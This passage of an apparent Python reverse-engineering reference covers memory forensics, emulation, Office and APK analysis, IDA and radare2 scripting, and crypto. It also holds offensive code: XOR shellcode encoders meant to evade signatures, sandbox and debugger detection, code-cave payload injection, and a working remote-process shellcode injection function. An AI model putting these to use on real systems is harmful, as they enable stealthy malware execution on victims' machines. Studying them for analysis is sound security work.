# List processes
python3 vol.py -f memory.dmp windows.pslist.PsList

# Dump a process by PID
python3 vol.py -f memory.dmp windows.dumpfiles.DumpFiles --pid 740

# Scan for network connections
python3 vol.py -f memory.dmp windows.netscan.NetScan

# Dump registry hives
python3 vol.py -f memory.dmp windows.registry.hivelist.HiveList
```

**Writing a custom Volatility 3 plugin:**

```python
import volatility3.framework.interfaces.plugins as interfaces
from volatility3.framework import renderers
from volatility3.framework.configuration import requirements
from volatility3.framework.objects import utility

class MyMalwareFinder(interfaces.PluginInterface):
    @classmethod
    def get_requirements(cls):
        return [
            requirements.ModuleRequirement(
                name='kernel', description='Windows kernel',
                architectures=['Intel32', 'Intel64']
            )
        ]

    def _generator(self):
        kernel = self.config['kernel']
        for proc in kernel.layer.object_list('_EPROCESS'):
            name = utility.array_to_string(proc.ImageFileName)
            yield (0, (proc.UniqueProcessId, name))

    def run(self):
        return renderers.TreeGrid([
            ('PID', int), ('Name', str)
        ], self._generator())
```

**Python API for batch analysis:**

```python
from volatility3.framework import contexts, automagic

ctx = contexts.Context()
# Automatically detect profile/layer
auto = automagic.available(ctx)
# Run a plugin programmatically
from volatility3.plugins.windows import pslist
result = pslist.PsList.run_plugin(ctx, 'memory.dmp')
for entry in result:
    print(f"{entry['PID']:6d} {entry['ImageFileName']}")
```

**Use cases:**
- Extract process list, DLL lists, handles, and loaded modules from RAM
- Recover injected code via Malfind / VadInfo
- Dump and scan processes with YARA
- Extract registry keys, network connections, and cmdline arguments
- Timeline reconstruction of attacker activity

---

## 17. Qiling Framework — Binary Emulation Sandbox

Qiling builds on Unicorn to provide OS-level emulation — it loads PE/ELF/MachO, handles syscalls, resolves imports, and lets you instrument code at instruction/basic-block/syscall granularity.

**Basic sandbox:**

```python
from qiling import Qiling

def my_sandbox(path, rootfs):
    ql = Qiling(path, rootfs)
    ql.run()

# Emulate a Windows EXE on Linux
my_sandbox([
    'examples/rootfs/x86_windows/bin/x86_hello.exe'
], 'examples/rootfs/x86_windows')
```

**Code hooking & hotpatching:**

```python
from qiling import Qiling
from qiling.const import QL_INTERCEPT

def my_sandbox(path, rootfs):
    ql = Qiling(path, rootfs)

    # Hook every CALL instruction
    def hook_call(ql, address, size):
        print(f'CALL at {address:#x}')
    ql.hook_code(hook_call, begin=0x401000, end=0x404000)

    # Hook a syscall
    def hook_syscall(ql, write_func):
        params = ql.os.syscall_params
        print(f'syscall: fd={params[0]}, buf={params[1]:#x}')
        return write_func(ql, *params)
    ql.set_syscall('write', hook_syscall)

    # NOP out a conditional jump (hotpatch)
    ql.mem.write(0x401234, b'\x90\x90\x90\x90\x90\x90')

    ql.run()

my_sandbox(['crackme.exe'], 'rootfs/x86_windows')
```

**API hooking (Windows DLL):**

```python
from qiling import Qiling
from qiling.os.windows.api import *
from qiling.os.windows.fncc import *

@winsdkapi(cc=STDCALL, dllname="kernel32_dll")
def hook_GetProcAddress(ql, address, params):
    hModule = params['hModule']
    lpProcName = params['lpProcName']
    name = ql.mem.read(lpProcName, 64).split(b'\x00')[0].decode()
    print(f'GetProcAddress(hMod={hModule:#x}, "{name}")')
    return 0x41414141  # return fake address

ql.set_api("GetProcAddress", hook_GetProcAddress)
```

**Snapshot / restore (for fuzzing):**

```python
saved = ql.save()  # capture all registers + memory
ql.restore(saved)   # restore exactly
```

**Shellcode emulation:**

```python
from qiling import Qiling

# Emulate raw shellcode (no file needed)
ql = Qiling(code=b'\x31\xc0\x50\x68...', archtype='x86',
            ostype='linux', rootfs='/path/to/linux_rootfs')
ql.run()
```

**Use cases:**
- Emulate malware in isolated sandbox (WannaCry tested)
- Hook crypto API calls to extract decryption keys
- Dynamic unpacking — let the unpacker run, then dump memory
- Fuzz library functions with snapshot/restore
- RE of embedded firmware, UEFI, MBR, DOS

---

## 18. Oletools — Malicious Office Document Analysis

`oletools` detects, extracts, and analyzes VBA macros, OLE objects, XLM macros, and DDE links from Office documents.

**Quick triage with oleid:**

```python
from oletools.oleid import OLEID

oid = OLEID('suspicious.doc')
indicators = oid.check()
for i in indicators:
    print(f'{i.name}: {i.value}' if i.value is not None else f'{i.name}: {i.description}')
```

**Extract VBA macros with olevba:**

```python
from oletools.olevba import VBA_Parser

vbaparser = VBA_Parser('invoice.doc')
if vbaparser.detect_vba_macros():
    for (filename, stream_path, vba_filename, vba_code) in vbaparser.extract_macros():
        print(f'=== Macro: {vba_filename} ===')
        print(vba_code)

# Auto-deobfuscation analysis
results = vbaparser.analyze_macros()
for kw_type, keyword, description in results:
    print(f'[{kw_type}] {keyword} — {description}')
```

**Extract OLE objects:**

```python
from oletools.oleobj import OleObject

ole = OleObject('document.doc')
for obj in ole.extract_objects():
    print(f'OLE: {obj.class_name}, filename={obj.filename}')
    with open(obj.filename, 'wb') as f:
        f.write(obj.data)
```

**RTF object extraction:**

```python
from oletools.rtfobj import RtfObjParser

with open('document.rtf', 'rb') as f:
    parser = RtfObjParser(f.read())
parser.parse()
for obj in parser.objects:
    print(f'RTF OLE: {obj.class_name}, format={obj.ole_format}')
    if obj.oledata:
        with open(f'extracted_{obj.index}.bin', 'wb') as out:
            out.write(obj.oledata)
```

**Use cases:**
- Detect malicious macros (AutoOpen, Shell, CreateObject, HTTP GET)
- Extract deobfuscated VBA source code from phishing docs
- Identify Excel 4.0 XLM macros and DDE links
- Extract embedded executables / payloads from OLE objects
- Triage hundreds of documents with mraptor for maliciousness scoring

---

## 19. Androguard — Android APK Reverse Engineering

Androguard parses APK files, disassembles Dalvik bytecode, decompiles to Java, and builds call graphs.

**Parse an APK:**

```python
from androguard.core.apk import APK
from androguard.core.dex import DEX

a = APK('target.apk')
print(f'Package: {a.get_package()}')
print(f'Main Activity: {a.get_main_activity()}')
print(f'Permissions: {a.get_permissions()}')
print(f'Certificates: {a.get_certificates()}')

# List all DEX files
for dex in a.get_all_dex():
    d = DEX(dex)
    print(f'DEX: {d.get_classname_size()} classes')
```

**Disassemble & decompile:**

```python
from androguard.core.analysis.analysis import Analysis

d = DEX('classes.dex')
analysis = Analysis(d)

# Disassemble a specific method
for cls in d.get_classes():
    for method in cls.get_methods():
        if method.get_name() == 'onCreate':
            print(method.get_code().get_instructions())
            break

# Get call graph
cg = analysis.get_call_graph()
print(f'Nodes: {cg.number_of_nodes()}, Edges: {cg.number_of_edges()}')

# Find cross-references
for cls, method in analysis.find_methods(classname='Landroid/telephony/TelephonyManager'):
    for xref in method.get_xref_from():
        print(f'{xref[0].get_class_name()} -> {xref[1].get_name()}')
```

**Decompile to Java pseudocode:**

```python
from androguard.decompiler.decompiler import DecompilerJADX

d = DEX('classes.dex')
decompiler = DecompilerJADX(d, Analysis(d))
source = decompiler.get_source()
with open('output.java', 'w') as f:
    f.write(source)
```

**Use cases:**
- Identify dangerous permissions (SEND_SMS, RECORD_AUDIO, etc.)
- Find obfuscated strings via cross-references
- Detect dynamic class loading, reflection, native code usage
- Build call graphs for malware behavior analysis
- Decompile to Java for vulnerability assessment

---

## 20. IDAPython — Automating IDA Pro

IDAPython provides complete access to IDA's API — disassembly, decompilation, debugging, and patching — all scriptable.

**Basic information & navigation:**

```python
import idaapi
import idautils
import idc

# Binary info
info = idaapi.get_inf_structure()
print(f'Base: {info.start_ea:#x}, Bits: {64 if info.is_64bit() else 32}')

# Iterate all instructions
for ea in idautils.Heads():
    mnem = idc.print_insn_mnem(ea)
    opnd = idc.print_operand(ea, 0)
    print(f'{ea:#x}: {mnem} {opnd}')

# Get all names
for ea, name in idautils.Names():
    print(f'{ea:#x}: {name}')
```

**Patch bytes:**

```python
# NOP out a conditional jump
import ida_bytes
ida_bytes.patch_byte(0x401234, 0x90)
ida_bytes.patch_bytes(0x401234, b'\x90\x90\x90\x90\x90\x90')

# Write assembly via keystone (if available)
from keystone import *
ks = Ks(KS_ARCH_X86, KS_MODE_32)
encoding, _ = ks.asm('jmp 0x401500', addr=0x401234)
ida_bytes.patch_bytes(0x401234, bytes(encoding))
```

**Cross-references & analysis automation:**

```python
# Find all calls to a specific API
for ea in idautils.CodeRefsTo(0x7C8106D0, 0):  # kernel32!WriteFile
    print(f'Call to WriteFile from {ea:#x}')
    # Add a comment
    idc.set_cmt(ea, 'Patching WriteFile call', 0)

# Color basic blocks
for block in idautils.FuncItems(idc.here()):
    if idc.print_insn_mnem(block) == 'call':
        idaapi.set_item_color(block, 0x00FF00)  # green
```

**Hex-Rays decompiler scripting:**

```python
import ida_hexrays

# Decompile current function
cfunc = ida_hexrays.decompile(idc.here())
print(str(cfunc))

# Modify decompiler output
class MyVisitor(ida_hexrays.ctree_visitor_t):
    def visit_expr(self, expr):
        if expr.op == ida_hexrays.cot_call:
            print(f'Call at {expr.ea:#x}')
            return 0  # continue
        return 0

visitor = MyVisitor()
visitor.apply_to(cfunc.body, None)
```

**Batch mode (headless IDA):**

```python
# save as batch_extract.py
import ida_auto, ida_nalt, ida_loader, ida_pro
ida_auto.auto_wait()  # wait for analysis

# Extract all strings
for s in idautils.Strings():
    print(f'{s.ea:#x}: {str(s)}')

# Decompile all functions
import ida_hexrays
for ea in idautils.Functions():
    cfunc = ida_hexrays.decompile(ea)
    if cfunc:
        print(f'== {idc.get_func_name(ea)} ==')
        print(str(cfunc))

ida_pro.qexit(0)

# Run: ida -A -Sbatch_extract.py target.exe
```

**Use cases:**
- Bulk rename / annotate functions from FLIRT or FLAIR
- Automate deobfuscation (remove junk code, fold constants)
- Extract all strings, API calls, and CFGs from a binary
- Create custom decompiler patterns (virtual dispatch, switch recovery)
- Automate unpacking by tracing OEP finding

---

## 21. r2pipe — Scripting Radare2

r2pipe connects Python to a radare2 session via pipe, TCP, or HTTP. Every radare2 command is available as `r2.cmd()`.

**Basic usage:**

```python
import r2pipe

r2 = r2pipe.open('/bin/ls')
r2.cmd('aa')  # auto-analyze
print(r2.cmd('afl'))  # list functions

# JSON output parsed automatically
info = r2.cmdj('ij')
print(f"Format: {info['core']['format']}")

# Disassemble at entry
entry = r2.cmdj('iej')[0]['vaddr']
print(r2.cmd(f'pdf @ {entry:#x}'))
r2.quit()
```

**Advanced analysis loop:**

```python
r2 = r2pipe.open('malware.exe', flags=['-2'])  # suppress stderr
r2.cmd('aaa')  # deep analysis

# Enumerate all cross-references to a string
str_addr = r2.cmd('?v str.Hello')
xrefs = r2.cmdj(f'axtj {str_addr}')
for x in xrefs:
    print(f'Ref from {x["from"]:#x} in {x.get("fcn_name", "unknown")}')

# Extract all functions with their sizes
funcs = r2.cmdj('aflj')
for f in funcs:
    name = f['name']
    size = f['size']
    addr = f['offset']
    print(f'{addr:#x} ({size:5d} bytes)  {name}')

r2.quit()
```

**String decryption automation:**

```python
import r2pipe

r2 = r2pipe.open('encrypted_sample.bin')
r2.cmd('aa')

def decrypt_string_at(addr):
    # Get instruction info at address
    info = r2.cmdj(f'pdj 1 @ {addr}')[0]
    if 'val' not in info:
        return None
    val_addr = info['val']
    # Read bytes at value address
    enc_bytes = r2.cmd(f'pj 1 @ {val_addr}')
    # XOR decrypt
    key = 0x2A
    decrypted = bytes(b ^ key for b in bytes.fromhex(enc_bytes.replace(' ', '')))
    # Add comment in radare2
    r2.cmd(f'CCa {addr} "{decrypted.decode(errors="ignore")}"')
    return decrypted

for func_addr in [f['offset'] for f in r2.cmdj('aflj')]:
    decrypt_string_at(func_addr)

r2.quit()
```

**Remote debugging:**

```python
r2 = r2pipe.open('malware.exe', flags=['-d'])  # debug mode
r2.cmd('db main')  # breakpoint at main
r2.cmd('dc')       # continue to breakpoint
eax = r2.cmd('dr eax')
print(f'EAX = {eax}')
r2.cmd('dcr')      # continue until return
r2.quit()
```

**Use cases:**
- Batch-process hundreds of binaries for static features
- Automate string decryption in obfuscated malware
- Extract CFGs and function boundaries for binary diffing
- Script debugger sessions for unpacking
- Integrate with Ghidra via r2pipe for cross-tool automation

---

## 22. Scapy — Packet Crafting & Network RE

See `Modules/scapy.md` for basics. This section covers RE-specific patterns.

**TCP stream reassembly:**

```python
from scapy.all import *

packets = rdpcap('capture.pcap')
sessions = packets.sessions()

for session, pkts in sessions.items():
    if 'TCP' in session:
        payload = b''
        for p in pkts:
            if p.haslayer(Raw):
                payload += p[Raw].load
        if payload:
            print(f'[{session}] reassembled {len(payload)} bytes')
```

**Protocol fuzzing / mutation:**

```python
from scapy.all import *
from scapy.utils import rdpcap
import random

template = IP(dst='192.168.1.1')/TCP(dport=80)/Raw(b'GET / HTTP/1.0\r\n\r\n')

for _ in range(1000):
    pkt = template.copy()
    # Fuzz a random byte in the payload
    if pkt.haslayer(Raw):
        pay = bytearray(pkt[Raw].load)
        pos = random.randint(0, len(pay)-1)
        pay[pos] = random.randint(0, 255)
        pkt[Raw].load = bytes(pay)
    send(pkt, verbose=0)
```

**Extract files from PCAP:**

```python
from scapy.all import *

def extract_http_objects(pcap):
    pkts = rdpcap(pcap)
    for p in pkts:
        if p.haslayer(TCP) and p.haslayer(Raw):
            pay = p[Raw].load
            if b'HTTP/1.1 200 OK' in pay and b'Content-Type:' in pay:
                # Extract filename from Content-Disposition or URL
                print(f'[+] HTTP response from {p[IP].src}')
                # Save payload body
                body = pay.split(b'\r\n\r\n', 1)[-1]
                with open(f'extracted_{p[IP].id}', 'wb') as f:
                    f.write(body)

extract_http_objects('malware_traffic.pcap')
```

**TLS fingerprinting via JA3:**

```python
from scapy.all import *
import hashlib

pkt = rdpcap('capture.pcap')[0]
if pkt.haslayer(TLS):
    tls = pkt[TLS]
    # Build JA3 hash from Client Hello
    cipher_str = '-'.join(str(c) for c in tls.msg[0].cipher_suites)
    ext_str = '-'.join(str(e) for e in tls.msg[0].extensions)
    ja3 = hashlib.md5(f"{tls.msg[0].version},{cipher_str},{ext_str}".encode()).hexdigest()
    print(f'JA3: {ja3}')
```

**Use cases:**
- Reconstruct C2 payloads from pcap
- Identify malware C2 patterns via JA3/S signatures
- Craft packets for protocol RE and fuzzing
- Extract shellcode from network captures
- Decrypt TLS streams with pre-shared keys (Wireshark interop)

---

## 23. `cryptography` — Modern Cryptographic Primitives

`cryptography` provides high-level recipes (Fernet) and low-level primitives (AES, RSA, ECDSA, ChaCha20). See also `Modules/pycryptodome.md`.

**Fernet (symmetric, authenticated):**

```python
from cryptography.fernet import Fernet, InvalidToken

key = Fernet.generate_key()
fernet = Fernet(key)

token = fernet.encrypt(b'C2 config data')
try:
    data = fernet.decrypt(token)
    print(data)
except InvalidToken:
    print('Tampered data detected')
```

**AES-CBC with padding:**

```python
import os
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding

key = os.urandom(32)
iv = os.urandom(16)

# Encrypt
padder = padding.PKCS7(128).padder()
padded = padder.update(b'payload') + padder.finalize()
cipher = Cipher(algorithms.AES(key), modes.CBC(iv))
encryptor = cipher.encryptor()
ct = encryptor.update(padded) + encryptor.finalize()

# Decrypt
decryptor = cipher.decryptor()
padded_pt = decryptor.update(ct) + decryptor.finalize()
unpadder = padding.PKCS7(128).unpadder()
pt = unpadder.update(padded_pt) + unpadder.finalize()
print(pt)
```

**RSA key generation & encryption:**

```python
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes

# Generate keypair
private_key = rsa.generate_private_key(
    public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# Encrypt with public key
ciphertext = public_key.encrypt(
    b'short data',
    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                  algorithm=hashes.SHA256(), label=None))

# Decrypt with private key
plaintext = private_key.decrypt(
    ciphertext,
    padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),
                  algorithm=hashes.SHA256(), label=None))
```

**X.509 certificate parsing:**

```python
from cryptography import x509
from cryptography.hazmat.primitives import hashes

with open('cert.der', 'rb') as f:
    cert = x509.load_der_x509_certificate(f.read())

print(f'Subject: {cert.subject}')
print(f'Issuer: {cert.issuer}')
print(f'SANs: {cert.extensions.get_extension_for_class(x509.SubjectAlternativeName).value}')
print(f'Not before: {cert.not_valid_before_utc}')
print(f'Not after: {cert.not_valid_after_utc}')
fingerprint = cert.fingerprint(hashes.SHA256())
print(f'SHA256: {fingerprint.hex()}')
```

**Use cases:**
- Decrypt malware C2 traffic by implementing its custom crypto
- Extract and validate embedded certificates / public keys
- Re-implement custom packer decryption loops
- Generate key material for RATs and beacons
- Parse PKCS#7 / PKCS#12 stores from malware samples

---

## 24. Shellcode Encoding, Decoding & Generation

Practical patterns for working with shellcode — encoding for bad-character filters, decoding stubs, and generation.

**Alphanumeric XOR encoder:**

```python
def encode_alphanumeric(shellcode: bytes) -> bytes:
    """XOR encode shellcode with a single-byte key, produce
    a decoder stub and encoded payload."""
    key = 0xAA
    encoded = bytes(b ^ key for b in shellcode)
    # x86 decoder stub: decode [esi] then jmp to it
    stub = asm(f'''
        xor ecx, ecx
        mov esi, {id(encoded):#x}  ; placeholder
        loop:
        xor byte [esi+ecx], {key:#04x}
        inc ecx
        cmp ecx, {len(encoded)}
        jne loop
        jmp esi
    ''', arch='x86')
    return stub + encoded

# Encode with msfvenom-style single-byte xor key
def xor_single(data: bytes, key: int = 0x90) -> bytes:
    return bytes(b ^ key for b in data)
```

**Position-independent decoder (x64):**

```python
from pwn import *

def make_decoder_stub(key: int, length: int, arch='amd64') -> bytes:
    """Generate a CALL-POP decoder stub."""
    context.arch = arch
    stub = asm(f'''
        jmp get_enc
    back:
        pop rsi
        xor ecx, ecx
    loop:
        xor byte [rsi+rcx], {key:#04x}
        inc rcx
        cmp rcx, {length}
        jl loop
        jmp rsi
    get_enc:
        call back
    ''')
    return stub

full_shellcode = make_decoder_stub(0xAA, len(enc_payload)) + enc_payload
```

**Bad-character filter:**

```python
def avoid_badchars(data: bytes, bad: set) -> bytes:
    """NOP encoder — insert garbage instructions that don't affect
    shellcode but break signature-based detection."""
    good = []
    for b in data:
        good.append(b)
        if b in bad:
            # Insert a benign instruction after the bad byte
            good.extend([0x90, 0x90])  # NOP; NOP
    return bytes(good)

def find_xor_key(data: bytes, bad: set) -> int:
    """Brute-force a 1-byte XOR key that doesn't produce any bad char."""
    for key in range(256):
        encoded = bytes(b ^ key for b in data)
        if not set(encoded) & bad:
            return key
    raise ValueError('No valid XOR key found')
```

**Shellcode extraction from PCAP / memory:**

```python
def find_shellcode_in_buffer(data: bytes, min_len=64) -> list:
    """Heuristic: find long NOP-sled followed by executable-like bytes."""
    results = []
    i = 0
    while i < len(data):
        if data[i] in (0x90, 0xEB, 0xE8, 0xE9):
            # Potential sled start — look for non-trivial sequence
            for j in range(i, min(i + min_len, len(data) - 4)):
                # Check for CALL/JMP to relative offset
                if data[j] in (0xE8, 0xE9) and data[j+1] != 0x00:
                    results.append(data[i:j+5])
                    i = j + 5
                    break
            else:
                i += 1
        else:
            i += 1
    return results
```

---

## 25. Anti-Analysis Detection & Bypass Patterns

Detect sandboxes, debuggers, and analysis environments from Python.

**Detect debugger presence:**

```python
import sys, os, ctypes

def is_debugged():
    """Check PEB BeingDebugged flag on Windows."""
    if sys.platform != 'win32':
        return False
    kernel32 = ctypes.windll.kernel32
    return bool(kernel32.IsDebuggerPresent())

def check_peb():
    """Direct PEB access via NtQueryInformationProcess."""
    if sys.platform != 'win32':
        return False
    ntdll = ctypes.windll.ntdll
    buf = (ctypes.c_ubyte * 8)()
    ntdll.NtQueryInformationProcess(
        ctypes.c_void_p(-1), 0x7, buf, 8, None
    )
    return bool(buf[0])  # ProcessDebugPort != 0
```

**Sandbox detection:**

```python
import re

def detect_sandbox():
    indicators = []
    # Check common analysis tool processes
    proc_names = ['procmon.exe', 'wireshark.exe', 'vmtoolsd.exe',
                  'x32dbg.exe', 'x64dbg.exe', 'ollydbg.exe', 'ida.exe',
                  'vboxservice.exe', 'vboxtray.exe']
    for name in proc_names:
        cmd = f'tasklist /FI "IMAGENAME eq {name}" 2>nul'
        result = os.popen(cmd).read()
        if name.lower() in result.lower():
            indicators.append(f'Process: {name}')

    # Check MAC vendor for VM
    mac = os.popen('getmac').read()
    if re.search(r'(00:0C:29|00:50:56|00:05:69)', mac):
        indicators.append('VMware/Hyper-V MAC detected')

    # Check registry for VM artifacts (Windows)
    vm_keys = [
        r'HKLM\HARDWARE\DEVICEMAP\Scsi\Scsi Port 2\Scsi Bus 0\Target Id 0\Identifier',
    ]
    for key in vm_keys:
        result = os.popen(f'reg query "{key}" 2>nul').read()
        if 'VMware' in result or 'VBOX' in result:
            indicators.append(f'VM registry key: {key}')

    return indicators
```

**Timing-based anti-debug:**

```python
import time

def detect_slow_execution(threshold=2.0):
    """RDTSC-based timing check for debugger stepping."""
    start = time.perf_counter()
    # Burn CPU cycles
    for _ in range(10_000_000):
        pass
    elapsed = time.perf_counter() - start
    return elapsed > threshold  # abnormally slow = likely debugged
```

**Packer detection heuristics:**

```python
import lief

def detect_packer(path: str) -> list:
    binary = lief.parse(path)
    flags = []

    # High entropy sections
    for section in binary.sections:
        if section.entropy > 7.0:
            flags.append(f'High entropy: {section.name} ({section.entropy:.2f})')

    # Suspicious section names
    for section in binary.sections:
        if section.name.lower() in ('upx0', 'upx1', 'upx2', '.packed', '.themida'):
            flags.append(f'Packer section name: {section.name}')

    # Unusual section characteristics
    for section in binary.sections:
        if section.has_characteristic(lief.PE.SECTION_CHARACTERISTICS.MEM_WRITE) and \
           section.has_characteristic(lief.PE.SECTION_CHARACTERISTICS.MEM_EXECUTE):
            flags.append(f'W^X section: {section.name}')

    # Import anomalies
    if binary.format == lief.PE.FORMATS.PE:
        imports = binary.imports
        if not imports:
            flags.append('No imports (packed / statically linked)')
        else:
            has_loadlib = any('LoadLibrary' in str(i.name) for i in imports)
            has_getproc = any('GetProcAddress' in str(i.name) for i in imports)
            if has_loadlib and has_getproc and len(imports) < 5:
                flags.append('Minimal imports with dynamic resolution pattern')

    return flags
```

---

## 26. Code-Cave Analysis & Binary Patching

Find and use code caves (gaps in executable sections) for injecting payload or redirecting execution.

```python
import lief

def find_code_caves(path: str, min_size=128) -> list:
    binary = lief.parse(path)
    caves = []
    for section in binary.sections:
        data = section.content
        i = 0
        while i < len(data):
            if data[i] == 0x00:  # start of null bytes
                j = i
                while j < len(data) and data[j] == 0x00:
                    j += 1
                size = j - i
                if size >= min_size:
                    # Relative to file
                    file_offset = section.offset + i
                    # Relative to virtual address
                    va = section.virtual_address + i + binary.optional_header.imagebase
                    caves.append({
                        'offset': file_offset,
                        'va': va,
                        'size': size,
                        'section': section.name
                    })
                i = j
            else:
                i += 1
    return sorted(caves, key=lambda c: c['size'], reverse=True)

# Patch a redirect: JMP [RIP+offset] to code cave
def write_jmp_x64(binary: lief.Binary, from_va: int, to_va: int) -> bytes:
    """Write JMP rel32 at from_va jumping to to_va."""
    offset = to_va - (from_va + 5)
    jmp_stub = b'\xE9' + offset.to_bytes(4, 'little', signed=True)
    # Patch at the file offset corresponding to from_va
    return jmp_stub
```

**Patching via pwntools:**

```python
from pwn import *

elf = ELF('binary')

# Patch bytes at a virtual address
elf.write(0x401234, b'\x90\x90\x90\x90')  # NOP out check

# Save modified binary
elf.save('patched_binary')

# Alternatively, patch via assembly
asm_code = 'mov eax, 0; ret'
patch_bytes = asm(asm_code, arch='x86', vma=0x401234)
elf.write(0x401234, patch_bytes)
elf.save('patched')
```

---

## 27. Cheatsheet Additions

| Task | Module | Key Function |
|---|---|---|
| YARA rule scanning | `yara` | `yara.compile(source=...)` |
| Memory forensics | `volatility3` | `windows.pslist.PsList` |
| Binary emulation | `qiling` | `Qiling(path, rootfs)` |
| Office document macro analysis | `oletools` | `VBA_Parser(file)` |
| Android APK analysis | `androguard` | `APK('file.apk')` |
| IDA Pro automation | `idapython` | `idautils.Functions()` |
| Radare2 scripting | `r2pipe` | `r2pipe.open('binary')` |
| Network packet manipulation | `scapy` | `rdpcap('file.pcap')` |
| Symmetric crypto (high-level) | `cryptography.fernet` | `Fernet(key).encrypt(data)` |
| AES/RSA primitives | `cryptography.hazmat` | `Cipher(algorithms.AES(key), ...)` |
| XOR shellcode encoder | `pwn` / builtins | `bytes(b ^ k for b in data)` |
| Anti-debug checks | `ctypes` | `kernel32.IsDebuggerPresent()` |
| Packer detection | `lief` | `section.entropy > 7.0` |
| Code cave finder | `lief` | `section.content` scan for nulls |

### Common Crypto Constants & Magic Bytes

```python
# Known malware crypto constants
MAGIC_XOR_KEYS = [0x90, 0xAA, 0xFF, 0x69, 0x2A, 0x41, 0x37, 0x6B, 0x7A, 0x11]
RC4_KEY_PATTERNS = [b'abc', b'key', b'rc4', b'enc', b'\x00' * 16]

# PE / ELF magic
PE_MAGIC = b'MZ'
ELF_MAGIC = b'\x7fELF'
DEX_MAGIC = b'dex\n'
JAVA_CLASS = b'\xca\xfe\xba\xbe'
```

### Process Injection Pattern (ctypes)

```python
import ctypes

def inject_shellcode(pid: int, shellcode: bytes):
    kernel32 = ctypes.windll.kernel32
    PROCESS_ALL_ACCESS = 0x1F0FFF

    hProcess = kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
    addr = kernel32.VirtualAllocEx(hProcess, None, len(shellcode),
                                    0x3000, 0x40)  # MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE
    written = ctypes.c_size_t()
    kernel32.WriteProcessMemory(hProcess, addr, shellcode, len(shellcode),
                                ctypes.byref(written))
    hThread = kernel32.CreateRemoteThread(hProcess, None, 0, addr, None, 0, None)
    kernel32.CloseHandle(hThread)
    kernel32.CloseHandle(hProcess)
```

---

*This guide covers the most essential Python modules for reverse engineering, exploit development, and security research. Each module has extensive documentation and community resources for deeper learning.*
